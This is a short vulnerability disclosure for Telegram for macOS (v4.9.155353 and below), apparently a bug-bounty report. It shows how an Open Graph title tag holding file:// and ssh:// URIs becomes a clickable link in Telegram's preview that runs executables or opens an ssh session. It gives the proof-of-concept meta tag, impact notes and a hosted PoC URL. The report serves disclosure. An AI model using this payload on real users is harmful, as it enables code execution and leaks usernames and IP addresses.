**Summary**

In **Telegram for macOS v4.9.155353** (and below) URL parsing logic in Telegram for macOS platform allows running arbitrary executables and applications URI schemes via links injected into the website's preview.

**PoC**

1. Send a link to `exploit.html` - a regular HTML file with `<meta property="og:title" content="file://google.com/bin/sh ssh://google.com/x" />` tag
2. Website preview renders `file://google.com/bin/sh` and `ssh://google.com/x` as links
3. Click on the rendered links behaves as `NSWorkspace.open` util -> if points to executable -> code execution.
4. Click on `ssh://` link -> Terminal.app popups with an active ssh session disclosing user's OS username, ip and other details.

**Impact**

The bug could be used for:
1. disclosing info about user's machine -> OS username, IP, etc
2. running arbitrary executables and opening arbitrary files on OS
3. launching arbitrary applications via URI schemes

This bug could be chained with Quarantine issue to open downloaded quarantine-ignored files and chain this into running of attacker-supplied executable.

**Additional Details**

This bug also exists in iOS, PoC is the same. 
Impact possibly limited to URI schemes.

PoC URL -> https://telegram-file-link-1xfcjf27f.now.sh/exploit.html
